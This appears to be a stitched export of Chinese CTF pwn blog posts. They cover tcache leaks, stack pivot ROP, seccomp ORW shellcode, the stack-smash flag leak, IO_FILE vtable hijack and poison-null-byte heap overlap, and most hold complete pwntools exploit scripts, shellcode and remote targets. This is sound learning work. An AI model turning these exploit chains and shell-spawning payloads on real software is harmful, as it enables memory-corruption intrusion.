不过这题碰到了一个新的机制tcache。tcache是在libc2.23之后引入的，跟glibc中的各种bin类似，是一个对chunk进行申请释放操作时会用到的一个内存池。tcache是64个单向链表，每个链表最多7个节点(chunk)，chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）。 ​ 在这题中，申请chunk的大小统一为0x100，属于unsort bin，所以我们如果释放8个chunk，才会使第8个chunk处于unsort bin中。而此时unsort bin中仅有一个chunk，其fd和bk都指向main_arena的一定偏移处。即可leak出libc。 ​ payload参考 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level=&quot;debug&quot;def add(index): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;: &quot;,str(index))def edit(index,note): p.sendlineafter(&quot;: &quot;,&quot;2&quot;) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendafter(&quot;Content: &quot;,note)def show(index): p.sendlineafter(&quot;: &quot;,&quot;3&quot;) p.sendlineafter(&quot;Index: &quot;,str(index))def delete(index): p.sendlineafter(&quot;: &quot;,&quot;4&quot;) p.sendlineafter(&quot;: &quot;,str(index))#p=remote(&quot;121.36.74.70&quot;,9999)p=process(&quot;./of&quot;)for i in range(9): add(i)for i in range(8): delete(i)show(7)p.recvuntil(&quot;: &quot;)libc=u64(p.recv(6)+&quot;\\x00\\x00&quot;)-0x7ffff7dcfca0+0x7ffff79e4000print hex(libc)edit(6,p64(libc+0x003ed8e8))edit(0,&quot;/bin/sh\\x00&quot;)add(10)add(11)edit(11,p64(libc+0x04f440))delete(0)p.interactive() 0x01 . twice​ 本质上是个rop题。。。但是确实非常费脑子，看得头秃，有的调试还没整明白，之后再详细研究漏洞原理。 ​ 主函数如下，主要功能是遍历调用judge1，实际上只能成功调用两次。 ​ judge1是程序的主要函数，实现了读入的功能，读入的字节数由judge2决定。而且如果ncount不为0或1，则返回值为0，这也就限定了主函数中的for循环仅进行两次。 ​ judge2中限定了，ncount为0时返回值为89，ncount为1时返回值为112，其他情况下不允许读入。 ​ 程序的主要功能是允许进行两次读入，第一次读入89字节，第二次112字节，但是buf的长度是88，因此会溢出一个字节。 ​ 利用这个溢出，再加上read读入数据不加以补“\\x00”的特性，在read的下一步进行puts时，程序会输出到下一个”\\x00”为止，因此我们可以泄露出旧的rbp地址以及canary的值。 ​ 不过程序开启了NX保护，栈上代码不可执行，不能直接写shellcode。这里需要用到新知识，栈转移技术（frame faking），制作一个假的栈帧进行rop。因为程序中没有system函数，因此我们需要用rop泄露出libc基址，再进行rop调用system(“/bin/sh”) ​ frame faking的大致payload格式为： ​ |xxxx xxxx|rop chain|padding|fake ebp|leave addr| ​ 将返回地址覆盖为leave汇编代码的地址，这样read函数结束后先进行本身函数的leave操作，再跳转到指定地址（即leave地址）又进行一次leave操作，使得rsp和rbp指向rop chain的适当位置，得以执行我们设计的fake stack frame。 ​ 将rop chain细化可以得到如下payload： ​ |xxxx xxxx|arg1|arg2|…|fuction addr|ret addr|padding|fake ebp|leave addr| ​ 为了多次进行leak，需要把上述ret addr即假栈帧的返回地址，再设置为漏洞所在函数，即可重复调用。 ​ 此处需要注意的是，rop chain中可能需要进行弹栈操作，需要利用ROPgardge查找相应的地址。 ​ payload参考 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = &#x27;debug&#x27; p = process(&#x27;./twice&#x27;)puts_plt_addr = 0x4005C0read_got_addr = 0x601038pop_rdi = 0x400923leave = 0x400879main_addr = 0x40087Bp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp)+p64(leave)p.send(payload)p.recvuntil(&#x27;\\n&#x27;)libc_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))-0xEE590sp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp2 = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp2))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(libc_addr+0x1881AC)+p64(libc_addr+0x48880)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp2)+p64(leave)p.send(payload)p.interactive()","categories":[],"tags":[]},{"title":"Seccomp Sandbox (ORW)","slug":"sandbox","date":"2020-07-07T13:14:08.000Z","updated":"2021-03-23T08:38:46.839Z","comments":true,"path":"2020/07/07/sandbox/","link":"","permalink":"http://example.com/2020/07/07/sandbox/","excerpt":"​ freebuf公开课pwn第五课总结。","text":"​ freebuf公开课pwn第五课总结。 0x00 . 沙箱​ 沙箱是一个虚拟系统程序，沙箱提供的环境相对于每一个运行的程序都是独立的，而且不会对现有的系统产生影响，即沙箱提供一个限制该应用程序对系统资源的访问权限。如果程序调用了沙箱函数，也就是说后面执行的代码都会在这个沙箱中进行。而沙箱会限制许多库函数导致其无法使用。所以如果要getshell，要么仅利用当前沙箱允许的程序进行getshell，要么进行沙箱逃逸(一般指的是python沙箱逃逸)。具体方式需要结合实际的环境和情况。 0x01 . ORW​ orw指的是三个最基本的库函数，open，read，write。很多时候题目会要求我们仅用这三个函数实现getshell。大致程序流程为： 123fd = open(&quot;/home/test/flag&quot;); //用open函数打开flag文件并获取索引read(fd,buf,0x100); //将文件中的文本通过read函数输入到buf中write(1,buf,0x100); //用write函数输出buf 0x02 . orw From pwnable.tw​ 在pwnable.tw上找了一个沙箱例题。 1.Analysis​ 例行公事1： ​ 例行公事2： ​ 例行公事3： ​ 运行之后是segment fault。 ​ 在ida32上可以看到main函数十分简短，而且发现了大大的orw_seccomp()，可以确定程序存在沙箱没跑了。 ​ 而沙箱函数后面的程序，大意就是输入shellcode并用函数指针执行。但是因为存在沙箱，所以当然不能直接执行system(“/bin/sh”)。先用seccomp-tools来看看程序沙箱的限制。 ​ 程序中orw的三个函数都是可以调用的。因此需要通过这三个函数写shellcode。 2.Shellcode​ 我们已经知道了只运用orw三个函数如何获取flag，现在只需要把整个流程写成汇编的shellcode即可。 ​ 除此之外还需要查一下系统调用函数需要用到那些寄存器，及其分别有哪些作用： a . fd = open(“/home/orw/flag”)123456789xor eax,eax;xor ebx,ebx; //初始化xor ecx,ecx;xor edx,edx;mov eax,0x5; //open的系统调用码为0x5push 0x00006761; //flag路径，需要补0push 0x6c662f77; //逆序push 0x726f2f65; //压栈暂存push 0x6d6f682f; mov ebx,esp; //路径保存至ebxint 0x80; b . read(fd,buf,0x30);12345mov ebx,eax; //上一函数后，eax已获得fdmov ecx,esp; //将路径的flag文件read到栈上mov edx,0x30; //读取字节数为0x30mov eax,0x03; //read的系统调用码为0x3int 0x80; c.write(1,buf,0x30)12345mov eax,0x4; //write的系统调用码为0x4mov ebx,0x1; //fd = stdoutmov ecx,ecx; //要输出的flag在栈上，但是ecx已经指向esp了，因此本步可以不写mov edx,0x30; //输出字节数为0x30int 0x80; 3.Exploit1234567891011from pwn import *#p = process(&quot;./orw&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10001)_open = &quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;_read = &quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;_write = &quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;payload = _open+_read+_writepayload = asm(payload)p.send(payload)print p.recv(0x20)p.interactive()","categories":[],"tags":[]},{"title":"2018网鼎pwn (guess复现)","slug":"guess","date":"2020-04-13T12:14:08.000Z","updated":"2021-03-23T08:37:39.059Z","comments":true,"path":"2020/04/13/guess/","link":"","permalink":"http://example.com/2020/04/13/guess/","excerpt":"​ 2018网鼎pwn题复现与学习。","text":"​ 2018网鼎pwn题复现与学习。 ​ 因为网鼎、铁三、国赛差不多了，而且刘老板也给了建议，就决定来复现一下2018网鼎的pwn题。毕竟赛题比一般的旧题目含金量更多，能学到很多东西。 ​ 写题解之前先贴一些铺垫知识，都是这个题目会用到的，也是新学到的。 0x00 . Stack Smash​ 这个技术算是栈溢出技术的一种，也收录在CTF-Wiki中。 ​ 对于开启了canary保护的程序，我们不能直接进行栈溢出，因为会破坏canary的值。 ​ 如果函数返回时检查到canary被破坏了，就会跳转到__stack_chk_fail()函数开始执行。 ​ 看一下库文件中的__stack_chk_fail()及其引用函数： ​ 再看一下源码(版本为glibc-2.23)： ​ 我们可以看到，__stack_chk_fail()会调用__fortify_fail()，而后者输出了一行字符串，实际上是用来提示用户该程序出错，而__libc_argv[0]中存的就是程序名。 ​ 而该变量作为命令行参数，存在main函数的栈帧上，也就是说，如果我们在栈上可以进行足够长的输入，就能覆盖canary，再将想要泄露的target_addr覆盖argv[0]，此时系统监测到溢出，执行__stack_chk_fail()和__fortify_fail()就能输出target_get的内容。 ​ 用这样的栈溢出理论上实现了任意读（满足读权限），但是泄露了之后系统就关闭进程，无法继续攻击。 0x01 . Linux 父子进程​ 在linux程序中，一般用fork函数来创建一个新的子进程。 ​ 这个新的子进程理论上算是原进程的一个副本，执行fork()时，系统先为子进程分配资源，再将原进程的一系列数据和变量复制到子进程中。这个复制的结果是，数据和变量的值都一样，在系统中的虚拟地址是一样的，但是物理地址不同，也就是说将数据复制到了另一个物理地址，即副本。 ​ 而新进程原进程在fork()执行之后，返回值为子进程的id。那么对于v1变量，原进程的值为子进程的id，子进程没有子进程，v1自然为0。如果返回值为-1，即创建进程失败。 ​ 当fork()执行结束，父子进程的下一行代码都是if(v1 == -1)，都从这里开始执行。 0x02 . GUESSA . Analysis​ 用ida打开文件可以看见，程序一开始就将flag.txt读取到了栈上: ​ 不过程序中存在canary保护。 ​ 跑一下，其实就是让你输入flag。输入AAAAAAAA。 ​ gdb调试看看栈上的情况，可以看到flag的确在栈上（此处用了本地的flag）。 ​ 可以得知以下部分变量的地址。 Variable Addr argv[0] 0x7fffffffdd88 flag.txt 0x7fffffffdc30 User Input 0x7fffffffdc60 ​ 其中argv[0]为命令行参数，存的是程序路径及程序名“GUESS”。之所以要提到argv[0]是因为此处可以用到本文上述的花式栈溢出技巧stack smash。因为程序中的用户输入是用gets()实现的，因此用我们可以用input将足够长的padding和puts的got表值覆盖到argv[0]，从而泄露libc基址。(0xdd88 - 0xdc60 == 0x128) ​ 得到了libc的地址，我们还需要泄露另一个变量environ。这个变量存的是程序的栈基址，我们可以根据flag.txt在栈上的固定偏移，来确定flag的实际地址。environ变量被存在符号表中，所以也可以通过上述的stack smash泄露got表的方式得到。 ​ gdb下断点得到当前的栈地址。 12environ - flag_aar == 0x168environ - 0x168 == flag_aar ​ 现在只要再一次进行stack smash泄露出栈上的flag即可。 B . Exploit123456789101112131415161718192021222324252627from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./guess&#x27;)elf = ELF(&#x27;./guess&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload = 0x128 * &#x27;B&#x27; + p64(elf.got[&#x27;puts&#x27;])p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)#gdb.attach(p)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)puts_gots = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;puts_gots : &quot; + hex(puts_gots)libc_addr = puts_gots - libc.symbols[&#x27;puts&#x27;]print &quot;libc_addr : &quot; + hex(libc_addr)stack_addr = libc_addr + libc.symbols[&#x27;environ&#x27;]payload = 0x128 * &#x27;B&#x27; + p64(stack_addr)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)stack_addr = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;stack_addr : &quot; + hex(stack_addr)payload = 0x128 * &#x27;C&#x27; + p64(stack_addr - 0x168)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)p.interactive()","categories":[],"tags":[]},{"title":"Vtable-Hijack(the_end)","slug":"Vtable-Hijack(the_end)","date":"2020-04-09T13:09:47.000Z","updated":"2021-03-23T08:40:03.411Z","comments":true,"path":"2020/04/09/Vtable-Hijack(the_end)/","link":"","permalink":"http://example.com/2020/04/09/Vtable-Hijack(the_end)/","excerpt":"​ 关于IO FILE 中的vtable劫持。","text":"​ 关于IO FILE 中的vtable劫持。 ​ 因为在wctf2020碰到了一个贼简单(没做出来🙃)的io重定向题目，而且刘老板刷how2heap的时候也碰到了一些io相关的题目，所以我感觉该稍微了解了解pwn中的io。 0x00 . IO入门 —— 基本结构体​ _IO_FILE是最基本的io流相关结构，长这样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ ​ _IO_FILE中有一个指针成员为chain，可以将进程中所有的_IO_FILE结构串起来，构成链表，链表头部存储在全局变量_IO_list_all中。再清理io流的时候会遍历此链表。 ​ 进程一开始，本来啥io流都没有，但是没有io就不能实现交互，所以所有进程都存在三个自动打开的io流：stdin，stdout，stderr。分别控制程序的输入，输出和报错。这三个io流都是_IO_FILE结构，在符号表中是这样存储的: 123_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ ​ _IO_FILE_plus在_IO_FILE的基础上，加上一个指向_IO_jump_t 结构体，叫vtable的指针，又封装成了一个结构体： 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; ​ 而这个vtable(虚表)指向的结构体，是一张函数表，存了许多与io操作相关的函数。io操作会通过交叉引用间接访问到函数表中的相关函数。这张函数表长这样： 1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps =&#123; **JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 0x01 . Vtable 劫持​ vtable，或者叫虚表。IO的相关操作中，某些函数会调用到虚表中的值。比如exit()会在一系列的交叉引用中调用到其虚表中的setbuf()，printf()会用到xput()等等。详细的调用只能查查看相关函数的源代码了。。。以后再详述。（🕊🕊🕊） ​ 虚表说起来跟got表plt表差不多(个人理解)，都可以通过劫持表来控制程序流程。但不同的是，got表可写，虚表不能直接改写，这也就限制了我们不能直接修改虚表使其指向目标函数。但是我们可以通过伪造虚表达到同样效果。大致思路如下： 要找到虚表，得先找到它所在的结构体，即_IO_FILE_plus位于哪里。这里我们需要知道：如果文件流是以fopen()的方式打开的，那么文件流会存在堆上；而如果是stdin，stdout，stderr则是存在库文件中。本文章仅考虑后者的情况。 首先我们要确定库文件的版本，根据不同版本确定vtable相对于_IO_FILE_plus开始地址的偏移量。在libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。 根据偏移我们就能求出虚表的地址，就能伪造虚表劫持程序流程了。libc2.23版本下虚表的伪造不存在安全检测，更高的libc版本里则需要讨论保护绕过了。 之后还需要找到函数调用过虚表中的哪个函数(victim_function)，通过固定偏移和程序中的其他漏洞，进行任意写，将victim_function换成one_gadget地址，就能getshell。 0x02 . the_end1 . Analysis​ 例行公事如下： ​ main函数如下，除此之外没有其他乱七八糟的函数了。。 ​ 在for循环里面可以看到，程序允许用户进行五次输入操作的循环，每次循环中，将用户的第一次输入作为一个地址（可写入8个字节，对于64位程序来说恰好为一个地址），用户的第二次输入就将写在这个地址中（可写入1个字节）。 ​ 也就是说，我们可以实现任意地址写，不过只能写5个字节。 ​ 主函数中，for循环的任意写结束后就是exit函数了，而且题目“the_end”也很明显地提示了漏洞应该在结尾处，所以聪明机智的我考虑捯饬捯饬exit函数。 2 . Attack​ 去了解之后知道了exit()函数作用是结束子进程，返回给父进程，那当然需要清理IO流咯。又了解到它清理IO流时，系统会遍历IO_list_all，调用IO_2_1_stdout_，再调用vtable 中 _setbuf 函数。 ​ 用ida打开libc-2.23.so，先找出IO_2_1_stdout_符号，之后看结构可以确定，0x3C56F8处的就是虚表。 ​ 根据虚表在64位程序中的偏移，可以求出虚表的地址。 ​ 查一下上面的虚函数表，可以计算出setbuf相对于vtable的偏移量为11 * 0x8 = 0x58（64位）。根据setbuf的偏移，可以求出setbuf的地址。 ​ 所以我们要做的就是：伪造一个虚表，将fake_vtabel+0x58的地方改成one_gadget的地址，再将虚表指向伪造的虚表。然后函数调用到setbuf的时候就会定位到伪造虚表中的one_gadget地址。 ​ 因为我们只能写入5个字节，所以fake_vtable+0x58与one_gadget，虚表和伪造虚表的偏移都不能太大。所以考虑将虚表定位在虚表的附近，用两个字节来覆写，然后再用剩下三个字节将one_gadget写入到fake_vtable+0x58。 ​ 最后getshell时需要注意，程序中的： 12close(1);close(2); ​ 两行代码将输出流错误流关掉了，所以最后我们getshell的时候没有回显，具体对策是最后getshell后，进行io重定向，将输出流重定向到输入流，即使用如下命令： 1cat flag.txt 1&gt;&amp;0 3.Exploit（from CTF-Wiki😓）​ 由于莫名其妙的原因，我在ubuntu中运行程序的时候，只能进行7次输入，然后就直接退出了。。。。也不知道自己写的exp对不对，还是贴一下CTF-Wiki的吧。 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level=&quot;debug&quot;libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)# p = process(&#x27;the_end&#x27;)p = remote(&#x27;127.0.0.1&#x27;,1234)rem = 0if rem ==1: p = remote(&#x27;150.109.44.250&#x27;,20002) p.recvuntil(&#x27;Input your token:&#x27;) p.sendline(&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;)sleep_ad = p.recvuntil(&#x27;, good luck&#x27;,drop=True).split(&#x27; &#x27;)[-1]libc_base = long(sleep_ad,16) - libc.symbols[&#x27;sleep&#x27;]one_gadget = libc_base + 0xf02b0vtables = libc_base + 0x3C56F8fake_vtable = libc_base + 0x3c5588target_addr = libc_base + 0x3c55e0print &#x27;libc_base: &#x27;,hex(libc_base)print &#x27;one_gadget:&#x27;,hex(one_gadget)print &#x27;exit_addr:&#x27;,hex(libc_base + libc.symbols[&#x27;exit&#x27;])# gdb.attach(p)for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i])for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i])p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)p.interactive() ​ ​","categories":[],"tags":[]},{"title":"Off_By_One (plaiddb)","slug":"Off_By_One","date":"2020-03-16T08:09:47.000Z","updated":"2021-03-23T08:38:25.717Z","comments":true,"path":"2020/03/16/Off_By_One/","link":"","permalink":"http://example.com/2020/03/16/Off_By_One/","excerpt":"​ plaiddb快把我肝崩溃了。。","text":"​ plaiddb快把我肝崩溃了。。 0x00 . Off_By_One​ 这个知识点在how2heap里是叫poison_null_byte，结果我上ctf-wiki找writeup的时候没找着，原来人家也叫off_by_one。下面先分析代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; fprintf(stderr, &quot;Welcome to poison null byte 2.0!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, &quot;We allocate 0x100 bytes for &#x27;a&#x27;.\\n&quot;); a = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;a: %p\\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot; &quot;(it may be more than 0x100 because of rounding): %#x\\n&quot;, real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr, &quot;b: %p\\n&quot;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;c: %p\\n&quot;, c); barrier = malloc(0x100); fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n&quot; &quot;The barrier is not strictly necessary, but makes things less confusing\\n&quot;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot; &quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\\n&quot;); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\\n&quot;); fprintf(stderr, &quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;); a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot; fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, &quot;c.prev_size is %#lx\\n&quot;,*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, &quot;b1: %p\\n&quot;,b1); fprintf(stderr, &quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot; &quot;At this point c.prev_size should have been updated, but it was not: %#lx\\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot; &quot;before c.prev_size: %lx\\n&quot;,*(((uint64_t*)c)-4)); fprintf(stderr, &quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\\n&quot;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, &quot;b2: %p\\n&quot;,b2); memset(b2,&#x27;B&#x27;,0x80); fprintf(stderr, &quot;Current b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\\n&quot;); free(b1); free(c); fprintf(stderr, &quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\\n&quot;); d = malloc(0x300); fprintf(stderr, &quot;d: %p\\n&quot;,d); fprintf(stderr, &quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\\n&quot;); memset(d,&#x27;D&#x27;,0x300); fprintf(stderr, &quot;New b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot; &quot;for the clear explanation of this technique.\\n&quot;);&#125; ​ 代码一开始还没看懂来着，看着它把b一分为二一头雾水不知道干啥，后来看了下刘老板的blog才理解的。 ​ 其大致的意思就是：系统的边界检查不严谨，当chunk填充大小为malloc_size时，整个chunk被字符串填满，而字符串还需要有’\\x00’字符结尾，也就将下一个chunk的size的第一个字节修改了，有可能只改了in_use位(0x101 –&gt; 0x100)，有可能size和in_use位都改了(0x111 –&gt; 0x100)，这要看具体的chunk_size和利用过程。 ​ 参考如下示意图（没想到画个图要那么久。。）： ​ 1.a = malloc(0x100) b = malloc(0x200) c = malloc(0x100) barrier = malloc(0x100)最后这个chunk是用来隔开top chunk，否则当c释放时，top chunk会将其合并。 ​ 2.接着用a的溢出将b_size修改成0x200，并同时在b+0x200的地方写入0x200用作fake_pre_size用来通过检查。然后释放b。系统就会将b到b+0x200的空间释放，而非释放整个b chunk。 ​ 3.现在b的可控大小为0x200，存于unsort bin，现在将其进行分割。b1 = malloc(0x100)，b2 = malloc(0x80)。b1用来进行unlink合并，b2用来overlap。 ​ 4.释放b1，释放c，系统会根据c的pre_size找到b1的size，发现in_use == 0，于是将其合并。如此一来，b1到c都变成了一个chunk被收到unsort bin中。 ​ 5.d = malloc(0x400)，可以使得d的一部分与b2发生overlap。 ​ 6.overlap之后可以进行很多攻击。例如先free(d)，再malloc出d到b2中间的部分，此时b2到barrier的剩余空间仍作为一个孤零零的chunk呆在unsort bin，所以其fd，bk都指向main arena，再用可控的chunk b2就可以leak。 0x01 . plaiddb​ 天知道我查了多少个writeup，能基本看懂的也只有ctf-wiki的。。。。（CTF-Wiki🐂🍺！！） A . Analysis​ 64位，文件保护全开。。 ​ 主要的数据结构如下（参考参考CTF-Wiki，我只分析出前三个。。）： 123456789struct Node &#123; char *key; long data_size; char *data; struct Node *left; struct Node *right; long what_1; long what_2; &#125; ​ 怪不得一大片乱糟糟的指针操作，原来是树结构。那还分析个🔨。 ​ 不过看了看writeup好像这题利用跟树结构没啥关系。 ​ 主要函数有：GET(show_single)，PUT(add)，DUMP(show_all)，DEL(delete)，read_in。 ​ 漏洞在read_in函数里，可以溢出一个空字节。而且此处用到的是realloc()函数，申请的内存大小是可用大小逐次乘2所得的结果，所以说需要特定大小的chunk才能进行溢出。(0x18,0x38,0x78,0xf8,0x1f8) 123456789101112131415161718192021222324252627282930313233343536373839char *sub_1040()&#123; char *v0; // r12 char *v1; // rbx size_t v2; // r14 char v3; // al char v4; // bp signed __int64 v5; // r13 char *v6; // rax v0 = malloc(8uLL); v1 = v0; v2 = malloc_usable_size(v0); while ( 1 ) &#123; v3 = _IO_getc(stdin); v4 = v3; if ( v3 == -1 ) sub_1020(); if ( v3 == 10 ) break; v5 = v1 - v0; if ( v2 &lt;= v1 - v0 ) &#123; v6 = realloc(v0, 2 * v2); //realloc require a special size of chunk v0 = v6; if ( !v6 ) &#123; puts(&quot;FATAL: Out of memory&quot;); exit(-1); &#125; v1 = &amp;v6[v5]; v2 = malloc_usable_size(v6); 